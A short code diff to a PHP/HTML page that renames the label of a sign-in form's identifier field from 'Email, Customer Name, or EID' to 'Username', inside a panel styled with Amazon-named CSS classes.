@@ -521,7 +521,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     <div id="panel-signin-1" class="amazon-box">
         <h2>Sign in</h2>
         <form id="form-check" onsubmit="event.preventDefault(); checkAccount();">
-            <label for="identifier">Email, Customer Name, or EID</label>
+            <label for="identifier">Username</label>
             <input type="text" id="identifier" name="identifier" required autocomplete="username">
             <button type="submit" class="amazon-btn" id="btn-continue">
                 <span class="amazon-spinner" id="spin-continue"></span> Continue
